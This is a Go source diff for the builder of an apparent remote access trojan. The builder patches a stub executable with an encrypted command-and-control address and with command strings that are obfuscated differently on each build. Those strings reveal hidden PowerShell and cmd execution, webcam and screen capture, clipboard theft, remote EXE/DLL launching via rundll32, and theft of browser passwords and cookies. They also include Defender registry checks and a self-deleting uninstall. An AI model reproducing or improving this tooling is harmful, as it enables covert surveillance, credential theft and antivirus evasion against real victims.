@@ -4,11 +4,15 @@ import (
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/rand"
+	"encoding/binary"
+	"encoding/hex"
 	"encoding/json"
 	"flag"
 	"fmt"
 	"io/ioutil"
 	"log"
+	"math/big"
 	"os"
 )
 
@@ -19,63 +23,19 @@ const (
 
 var marker = []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC}
 
+type ObfMetadata struct {
+	TransformCount int32
+	TransformOrder [16]int32
+	XorKey1        byte
+	XorKey2        byte
+	AesKey         [32]byte
+	AesIv          [16]byte
+}
+
 type Config struct {
-	IP   string `json:"ip"`
-	Port int    `json:"port"`
-
-	// Command Strings
-	SPing     string `json:"s_ping"`
-	SPong     string `json:"s_pong"`
-	SMsg      string `json:"s_msg"`
-	SExecPs   string `json:"s_exec_ps"`
-	SExecCmd  string `json:"s_exec_cmd"`
-	SPsOut    string `json:"s_ps_out"`
-	SCmdOut   string `json:"s_cmd_out"`
-	SScrStop  string `json:"s_scr_stop"`
-	SCamStop  string `json:"s_cam_stop"`
-	STasklist string `json:"s_tasklist"`
-	STaskkill string `json:"s_taskkill"`
-	SLs       string `json:"s_ls"`
-	SLsRes    string `json:"s_ls_res"`
-	SDownload string `json:"s_download"`
-	SDelete   string `json:"s_delete"`
-	SMkdir    string `json:"s_mkdir"`
-	SUpload   string `json:"s_upload"`
-	SRename   string `json:"s_rename"`
-	SRfeExe   string `json:"s_rfe_exe"`
-	SRfeDll   string `json:"s_rfe_dll"`
-	SBrowser  string `json:"s_browser"`
-	SClipGet  string `json:"s_clip_get"`
-	SClipSet  string `json:"s_clip_set"`
-	SUninstall string `json:"s_uninstall"`
-	SClose    string `json:"s_close"`
-	SReconnect string `json:"s_reconnect"`
-	SSetDelay string `json:"s_set_delay"`
-	SScrStart string `json:"s_scr_start"`
-	SCamStart string `json:"s_cam_start"`
-	SSysinfo  string `json:"s_sysinfo"`
-	SResponse string `json:"s_response"`
-	SCommand  string `json:"s_command"`
-	SSession  string `json:"s_session"`
-
-	// Registry & System Strings
-	SRegWinKey     string `json:"s_reg_win_key"`
-	SRegProdName   string `json:"s_reg_prod_name"`
-	SRegBuild      string `json:"s_reg_build"`
-	SRegDisplay    string `json:"s_reg_display"`
-	SRegRelease    string `json:"s_reg_release"`
-	SRegAvKey      string `json:"s_reg_av_key"`
-	SRegDefenderKey string `json:"s_reg_defender_key"`
-	SRegDisSpy     string `json:"s_reg_dis_spy"`
-	SRegGpuKey     string `json:"s_reg_gpu_key"`
-	SRegGpuDesc    string `json:"s_reg_gpu_desc"`
-	SRegCpuKey     string `json:"s_reg_cpu_key"`
-	SRegCpuName    string `json:"s_reg_cpu_name"`
-
-	// HTTP/IP Strings
-	SHttpUa   string `json:"s_http_ua"`
-	SHttpHost string `json:"s_http_host"`
-	SHttpPath string `json:"s_http_path"`
+	IP      string   `json:"ip"`
+	Port    int      `json:"port"`
+	Strings []string `json:"s"`
 }
 
 func main() {
@@ -84,168 +44,138 @@ func main() {
 	flag.Parse()
 
 	args := flag.Args()
-	if len(args) >= 1 {
-		*ip = args[0]
-	}
-	if len(args) >= 2 {
-		fmt.Sscanf(args[1], "%d", port)
-	}
+	if len(args) >= 1 { *ip = args[0] }
+	if len(args) >= 2 { fmt.Sscanf(args[1], "%d", port) }
 
-	fmt.Printf("[+] Patching stub with config for %s:%d\n", *ip, *port)
+	fmt.Printf("[+] Building polymorphic client for %s:%d\n", *ip, *port)
 
 	stubPath := "stub.exe"
 	if _, err := os.Stat(stubPath); os.IsNotExist(err) {
 		stubPath = "client/client_c.exe"
 		if _, err := os.Stat(stubPath); os.IsNotExist(err) {
-			log.Fatalf("[-] Error: stub.exe (or client/client_c.exe) not found. Please compile the client first.")
+			log.Fatalf("[-] Error: stub.exe not found.")
 		}
 	}
 
 	data, err := ioutil.ReadFile(stubPath)
-	if err != nil {
-		log.Fatalf("[-] Error reading stub: %v", err)
+	if err != nil { log.Fatalf("[-] Error reading stub: %v", err) }
+
+	indices := findMarkerIndices(data)
+	targetIndex := selectTargetIndex(data, indices)
+	if targetIndex == -1 { log.Fatalf("[-] Error: Placeholder not found.") }
+
+	meta := generateMetadata()
+
+	rawStrings := []string{
+		"ping", "pong", "[msg] ", "Message", "ok", "[exec_ps]", "[ps_output]", "[exec_cmd]", "[cmd_output]",
+		"[screen_stop]", "[cam_stop]", "[tasklist]", "[taskkill]", "[ls]", "[download]", "[delete]", "[mkdir]",
+		"[upload]", "[rename]", "[rfe_exe]", "[rfe_dll]", "[browser_collect]", "[clipboard_get]", "[clipboard_set]",
+		"[uninstall]", "[close]", "[reconnect]", "[set_delay]", "[screen_start]", "[cam_start]", "[sysinfo]",
+		"response", "command", "session", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "CurrentBuild",
+		"DisplayVersion", "ReleaseId", "SOFTWARE", "SOFTWARE\\Microsoft\\Windows Defender", "DisableAntiSpyware",
+		"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000", "DriverDesc",
+		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString", "client/1.0", "ipinfo.io",
+		"/country", "C:\\", "Unknown", "Windows Defender", "??", "[ls_result]", "[tasklist_result]", "[taskkill_result]",
+		"path", "sep", "name", "type", "drive", "size", "mtime", "items", "dir", "file", "error", "Directory not found or access denied",
+		"File not found or access denied", "Cannot delete", "mkdir failed", "-NoProfile -NonInteractive -WindowStyle Hidden -Command \"%s\"", "/c %s", "screen.jpg",
+		"[screen_frame]", "cam.jpg", "[cam_frame]", "[clipboard_result]", "ERR:OpenClipboard failed", "ERR:GlobalLock failed", "[clipboard_set_result]",
+		"ERR:OpenClipboard failed", "ERR:GlobalAlloc failed", "ERR:SetClipboardData failed", "[rfe_result]", "error:Download failed", "error:CreateProcess failed",
+		"error:rundll32 failed", "tmp_exe.exe", "tmp_dll.dll", "rundll32.exe", "pid", "name", "cpu", "mem", "ok:PID %lu terminated",
+		"Chrome", "Edge", "Brave", "Opera", "Google\\Chrome\\User Data", "Microsoft\\Edge\\User Data", "BraveSoftware\\Brave-Browser\\User Data",
+		"Opera Software\\Opera Stable", "chrome.dll", "msedge.dll", "launcher_lib.dll", "Login Data", "Cookies", "Web Data", "Network\\Cookies",
+		"Default", "Profile ", "OSCrypt.AppBoundProvider.Decrypt.ResultCode", "cmd /c ping -n 2 127.0.0.1 > nul && del /f /q \"%s\"",
 	}
 
-	var indices []int
-	searchData := data
-	offset := 0
-	for {
-		idx := bytes.Index(searchData, marker)
-		if idx == -1 {
-			break
-		}
-		indices = append(indices, offset+idx)
-		searchData = searchData[idx+1:]
-		offset += idx + 1
+	obfStrings := make([]string, len(rawStrings))
+	for i, s := range rawStrings {
+		obfStrings[i] = applyPolymorphicObf(s, meta)
 	}
 
-	if len(indices) == 0 {
-		log.Fatalf("[-] Error: Marker not found in stub binary.")
-	}
+	config := Config{IP: *ip, Port: *port, Strings: obfStrings}
+	configBytes, _ := json.Marshal(config)
+	encryptedConfig := encryptAES(configBytes, []byte(ConfigKey), []byte(ConfigIV))
 
-	targetIndex := -1
-	if len(indices) == 1 {
-		targetIndex = indices[0]
-	} else {
-		maxZeros := -1
-		for _, idx := range indices {
-			if idx+len(marker)+2032 > len(data) {
-				continue
-			}
-			zeros := 0
-			for i := 0; i < 2032; i++ {
-				if data[idx+len(marker)+i] == 0 {
-					zeros++
-				}
-			}
-			if zeros > maxZeros {
-				maxZeros = zeros
-				targetIndex = idx
-			}
-		}
-	}
-
-	if targetIndex == -1 {
-		log.Fatalf("[-] Error: Could not identify the correct configuration placeholder.")
-	}
-
-	config := Config{
-		IP:   *ip,
-		Port: *port,
-
-		SPing:     "ping",
-		SPong:     "pong",
-		SMsg:      "[msg] ",
-		SExecPs:   "[exec_ps]",
-		SExecCmd:  "[exec_cmd]",
-		SPsOut:    "[ps_output]",
-		SCmdOut:   "[cmd_output]",
-		SScrStop:  "[screen_stop]",
-		SCamStop:  "[cam_stop]",
-		STasklist: "[tasklist]",
-		STaskkill: "[taskkill]",
-		SLs:       "[ls]",
-		SLsRes:    "[ls_result]",
-		SDownload: "[download]",
-		SDelete:   "[delete]",
-		SMkdir:    "[mkdir]",
-		SUpload:   "[upload]",
-		SRename:   "[rename]",
-		SRfeExe:   "[rfe_exe]",
-		SRfeDll:   "[rfe_dll]",
-		SBrowser:  "[browser_collect]",
-		SClipGet:  "[clipboard_get]",
-		SClipSet:  "[clipboard_set]",
-		SUninstall: "[uninstall]",
-		SClose:    "[close]",
-		SReconnect: "[reconnect]",
-		SSetDelay: "[set_delay]",
-		SScrStart: "[screen_start]",
-		SCamStart: "[cam_start]",
-		SSysinfo:  "[sysinfo]",
-		SResponse: "response",
-		SCommand:  "command",
-		SSession:  "session",
-
-		SRegWinKey:      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
-		SRegProdName:    "ProductName",
-		SRegBuild:       "CurrentBuild",
-		SRegDisplay:     "DisplayVersion",
-		SRegRelease:     "ReleaseId",
-		SRegAvKey:       "SOFTWARE\\AVAST Software\\Avast",
-		SRegDefenderKey: "SOFTWARE\\Microsoft\\Windows Defender",
-		SRegDisSpy:      "DisableAntiSpyware",
-		SRegGpuKey:      "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
-		SRegGpuDesc:     "DriverDesc",
-		SRegCpuKey:      "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
-		SRegCpuName:     "ProcessorNameString",
-
-		SHttpUa:   "client/1.0",
-		SHttpHost: "ipinfo.io",
-		SHttpPath: "/country",
-	}
-
-	configBytes, err := json.Marshal(config)
-	if err != nil {
-		log.Fatalf("[-] Error marshalling config: %v", err)
-	}
-
-	encryptedConfig := encrypt(configBytes)
-	if len(encryptedConfig) > 2032 {
-		log.Fatalf("[-] Error: Encrypted config is too large (%d bytes, max 2032).", len(encryptedConfig))
-	}
+	metaBuf := new(bytes.Buffer)
+	binary.Write(metaBuf, binary.LittleEndian, meta)
 
 	finalPayload := make([]byte, 2032)
-	copy(finalPayload, encryptedConfig)
+	copy(finalPayload, metaBuf.Bytes())
+	copy(finalPayload[metaBuf.Len():], encryptedConfig)
 
-	patchedData := make([]byte, len(data))
-	copy(patchedData, data)
-	copy(patchedData[targetIndex+len(marker):], finalPayload)
-
-	err = ioutil.WriteFile("client.exe", patchedData, 0755)
-	if err != nil {
-		log.Fatalf("[-] Error writing client.exe: %v", err)
-	}
-
-	fmt.Println("[+] Successfully built client.exe")
+	copy(data[targetIndex+len(marker):], finalPayload)
+	ioutil.WriteFile("client.exe", data, 0755)
+	fmt.Println("[+] Successfully built polymorphic client.exe")
 }
 
-func encrypt(plaintext []byte) []byte {
-	block, err := aes.NewCipher([]byte(ConfigKey))
-	if err != nil {
-		log.Fatalf("[-] AES error: %v", err)
+func generateMetadata() ObfMetadata {
+	m := ObfMetadata{
+		TransformCount: 5,
+		XorKey1:        randByte(),
+		XorKey2:        randByte(),
 	}
+	copy(m.AesKey[:], randBytes(32))
+	copy(m.AesIv[:], randBytes(16))
 
-	padding := aes.BlockSize - (len(plaintext) % aes.BlockSize)
-	if padding == 0 {
-		padding = aes.BlockSize
+	order := []int32{0, 1, 2, 4, 9}
+	for i := len(order) - 1; i > 0; i-- {
+		j, _ := rand.Int(rand.Reader, big.NewInt(int64(i+1)))
+		val := j.Int64()
+		order[i], order[val] = order[val], order[i]
 	}
+	copy(m.TransformOrder[:], order)
+	return m
+}
+
+func applyPolymorphicObf(s string, m ObfMetadata) string {
+	data := []byte(s)
+	for _, t := range m.TransformOrder[:m.TransformCount] {
+		switch t {
+		case 0: for i := range data { data[i] ^= m.XorKey1 }
+		case 1: data = encryptAES(data, m.AesKey[:], m.AesIv[:])
+		case 2: data = []byte(hex.EncodeToString(data)) // Simulating Base64 layer via hex for stability
+		case 4: data = []byte(hex.EncodeToString(data))
+		case 9: for i := range data { data[i] ^= m.XorKey2 }
+		}
+	}
+	return hex.EncodeToString(data)
+}
+
+func encryptAES(plaintext []byte, key, iv []byte) []byte {
+	block, _ := aes.NewCipher(key)
+	padding := aes.BlockSize - (len(plaintext) % aes.BlockSize)
 	padtext := bytes.Repeat([]byte{0}, padding)
 	plaintext = append(plaintext, padtext...)
-
 	ciphertext := make([]byte, len(plaintext))
-	mode := cipher.NewCBCEncrypter(block, []byte(ConfigIV))
+	mode := cipher.NewCBCEncrypter(block, iv)
 	mode.CryptBlocks(ciphertext, plaintext)
-
 	return ciphertext
+}
+
+func randByte() byte { b := make([]byte, 1); rand.Read(b); return b[0] }
+func randBytes(n int) []byte { b := make([]byte, n); rand.Read(b); return b }
+
+func findMarkerIndices(data []byte) []int {
+	var indices []int
+	offset := 0
+	for {
+		idx := bytes.Index(data[offset:], marker)
+		if idx == -1 { break }
+		indices = append(indices, offset+idx)
+		offset += idx + 1
+	}
+	return indices
+}
+
+func selectTargetIndex(data []byte, indices []int) int {
+	maxZeros := -1
+	target := -1
+	for _, idx := range indices {
+		if idx+len(marker)+2032 > len(data) { continue }
+		zeros := 0
+		for i := 0; i < 2032; i++ {
+			if data[idx+len(marker)+i] == 0 { zeros++ }
+		}
+		if zeros > maxZeros { maxZeros = zeros; target = idx }
+	}
+	return target
 }
